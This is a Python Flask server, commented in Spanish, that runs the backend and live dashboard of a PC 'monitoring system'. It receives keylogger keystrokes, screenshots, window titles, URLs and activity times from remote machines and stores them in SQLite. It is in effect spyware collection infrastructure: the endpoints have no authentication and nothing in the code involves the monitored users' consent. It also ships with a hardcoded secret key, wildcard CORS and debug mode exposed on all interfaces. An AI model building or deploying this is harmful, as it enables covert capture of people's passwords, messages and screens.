from flask import Flask, render_template, jsonify, request, send_file
from flask_socketio import SocketIO, emit
import sqlite3
import json
import base64
import threading
import time
from datetime import datetime
import os
from werkzeug.utils import secure_filename
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'tu_clave_secreta_aqui'
socketio = SocketIO(app, cors_allowed_origins="*")

# Configuración de base de datos
DATABASE = 'monitoring.db'

def init_db():
    """Inicializar base de datos"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Tabla para usuarios/PCs monitoreadas
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS monitored_pcs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            pc_name TEXT UNIQUE NOT NULL,
            ip_address TEXT,
            status TEXT DEFAULT 'offline',
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            user_name TEXT
        )
    ''')
    
    # Tabla para screenshots
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            pc_id INTEGER,
            screenshot_data TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (pc_id) REFERENCES monitored_pcs (id)
        )
    ''')
    
    # Tabla para aplicaciones activas
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS active_applications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            pc_id INTEGER,
            app_name TEXT,
            window_title TEXT,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (pc_id) REFERENCES monitored_pcs (id)
        )
    ''')
    
    # Tabla para keylogger
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keylog_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            pc_id INTEGER,
            keys_pressed TEXT,
            application TEXT,
            window_title TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (pc_id) REFERENCES monitored_pcs (id)
        )
    ''')
    
    # Tabla para tiempos de actividad
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS activity_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            pc_id INTEGER,
            activity_type TEXT, -- 'active', 'idle', 'away'
            duration INTEGER, -- en segundos
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (pc_id) REFERENCES monitored_pcs (id)
        )
    ''')
    
    conn.commit()
    conn.close()

# Almacenamiento temporal para screenshots en tiempo real
live_screenshots = {}
connected_clients = {}

@app.route('/')
def dashboard():
    """Dashboard principal"""
    return render_template('dashboard.html')

@app.route('/api/pcs')
def get_monitored_pcs():
    """Obtener lista de PCs monitoreadas"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT id, pc_name, ip_address, status, last_seen, user_name 
        FROM monitored_pcs 
        ORDER BY pc_name
    ''')
    pcs = []
    for row in cursor.fetchall():
        pcs.append({
            'id': row[0],
            'pc_name': row[1],
            'ip_address': row[2],
            'status': row[3],
            'last_seen': row[4],
            'user_name': row[5],
            'has_screenshot': row[0] in live_screenshots
        })
    conn.close()
    return jsonify(pcs)

@app.route('/api/screenshot/<int:pc_id>')
def get_screenshot(pc_id):
    """Obtener screenshot actual de una PC"""
    if pc_id in live_screenshots:
        return jsonify({
            'success': True,
            'screenshot': live_screenshots[pc_id]['data'],
            'timestamp': live_screenshots[pc_id]['timestamp']
        })
    return jsonify({'success': False, 'message': 'No screenshot available'})

@app.route('/api/keylog/<int:pc_id>')
def get_keylog_data(pc_id):
    """Obtener datos del keylogger"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT keys_pressed, application, window_title, timestamp 
        FROM keylog_data 
        WHERE pc_id = ? 
        ORDER BY timestamp DESC 
        LIMIT 100
    ''', (pc_id,))
    
    keylog_data = []
    for row in cursor.fetchall():
        keylog_data.append({
            'keys_pressed': row[0],
            'application': row[1],
            'window_title': row[2],
            'timestamp': row[3]
        })
    
    conn.close()
    return jsonify(keylog_data)

@app.route('/api/activity/<int:pc_id>')
def get_activity_data(pc_id):
    """Obtener datos de actividad"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT activity_type, duration, timestamp 
        FROM activity_logs 
        WHERE pc_id = ? 
        ORDER BY timestamp DESC 
        LIMIT 50
    ''', (pc_id,))
    
    activity_data = []
    for row in cursor.fetchall():
        activity_data.append({
            'activity_type': row[0],
            'duration': row[1],
            'timestamp': row[2]
        })
    
    conn.close()
    return jsonify(activity_data)

@app.route('/api/applications/<int:pc_id>')
def get_applications(pc_id):
    """Obtener aplicaciones activas"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT app_name, window_title, url, timestamp 
        FROM active_applications 
        WHERE pc_id = ? 
        ORDER BY timestamp DESC 
        LIMIT 20
    ''', (pc_id,))
    
    apps_data = []
    for row in cursor.fetchall():
        apps_data.append({
            'app_name': row[0],
            'window_title': row[1],
            'url': row[2],
            'timestamp': row[3]
        })
    
    conn.close()
    return jsonify(apps_data)

# API endpoints para recibir datos de los clientes
@app.route('/api/client/register', methods=['POST'])
def register_client():
    """Registrar nuevo cliente/PC"""
    data = request.json
    pc_name = data.get('pc_name')
    ip_address = data.get('ip_address', request.remote_addr)
    user_name = data.get('user_name')
    
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Insertar o actualizar PC
    cursor.execute('''
        INSERT OR REPLACE INTO monitored_pcs 
        (pc_name, ip_address, status, last_seen, user_name)
        VALUES (?, ?, 'online', CURRENT_TIMESTAMP, ?)
    ''', (pc_name, ip_address, user_name))
    
    pc_id = cursor.lastrowid
    if cursor.rowcount == 0:  # Si fue actualización, obtener ID existente
        cursor.execute('SELECT id FROM monitored_pcs WHERE pc_name = ?', (pc_name,))
        pc_id = cursor.fetchone()[0]
    
    conn.commit()
    conn.close()
    
    return jsonify({'success': True, 'pc_id': pc_id})

@app.route('/api/client/screenshot', methods=['POST'])
def receive_screenshot():
    """Recibir screenshot del cliente"""
    data = request.json
    pc_id = data.get('pc_id')
    screenshot_data = data.get('screenshot')
    
    # Guardar en memoria para acceso en tiempo real
    live_screenshots[pc_id] = {
        'data': screenshot_data,
        'timestamp': datetime.now().isoformat()
    }
    
    # Opcional: guardar en base de datos (puede ser pesado)
    # conn = sqlite3.connect(DATABASE)
    # cursor = conn.cursor()
    # cursor.execute('''
    #     INSERT INTO screenshots (pc_id, screenshot_data)
    #     VALUES (?, ?)
    # ''', (pc_id, screenshot_data))
    # conn.commit()
    # conn.close()
    
    # Emitir update a dashboard en tiempo real
    socketio.emit('screenshot_update', {
        'pc_id': pc_id,
        'screenshot': screenshot_data
    })
    
    return jsonify({'success': True})

@app.route('/api/client/keylog', methods=['POST'])
def receive_keylog():
    """Recibir datos del keylogger"""
    data = request.json
    pc_id = data.get('pc_id')
    keys_pressed = data.get('keys_pressed')
    application = data.get('application')
    window_title = data.get('window_title')
    
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO keylog_data (pc_id, keys_pressed, application, window_title)
        VALUES (?, ?, ?, ?)
    ''', (pc_id, keys_pressed, application, window_title))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

@app.route('/api/client/activity', methods=['POST'])
def receive_activity():
    """Recibir datos de actividad"""
    data = request.json
    pc_id = data.get('pc_id')
    activity_type = data.get('activity_type')
    duration = data.get('duration', 0)
    
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO activity_logs (pc_id, activity_type, duration)
        VALUES (?, ?, ?)
    ''', (pc_id, activity_type, duration))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

@app.route('/api/client/applications', methods=['POST'])
def receive_applications():
    """Recibir aplicaciones activas"""
    data = request.json
    pc_id = data.get('pc_id')
    applications = data.get('applications', [])
    
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    for app in applications:
        cursor.execute('''
            INSERT INTO active_applications (pc_id, app_name, window_title, url)
            VALUES (?, ?, ?, ?)
        ''', (pc_id, app.get('name'), app.get('title'), app.get('url')))
    
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

@app.route('/api/client/heartbeat', methods=['POST'])
def client_heartbeat():
    """Heartbeat del cliente"""
    data = request.json
    pc_id = data.get('pc_id')
    
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        UPDATE monitored_pcs 
        SET status = 'online', last_seen = CURRENT_TIMESTAMP 
        WHERE id = ?
    ''', (pc_id,))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

# WebSocket events para tiempo real
@socketio.on('connect')
def handle_connect():
    print('Cliente conectado al dashboard')
    emit('connected', {'data': 'Conectado al sistema de monitoreo'})

@socketio.on('disconnect')
def handle_disconnect():
    print('Cliente desconectado del dashboard')

def cleanup_offline_clients():
    """Marcar clientes offline después de 5 minutos sin heartbeat"""
    while True:
        time.sleep(300)  # Verificar cada 5 minutos
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE monitored_pcs 
            SET status = 'offline' 
            WHERE datetime(last_seen) < datetime('now', '-5 minutes')
        ''')
        conn.commit()
        conn.close()

if __name__ == '__main__':
    init_db()
    
    # Iniciar hilo para limpieza de clientes offline
    cleanup_thread = threading.Thread(target=cleanup_offline_clients, daemon=True)
    cleanup_thread.start()
    
    # Crear carpeta templates si no existe
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    socketio.run(app, debug=True, host='0.0.0.0', port=5000)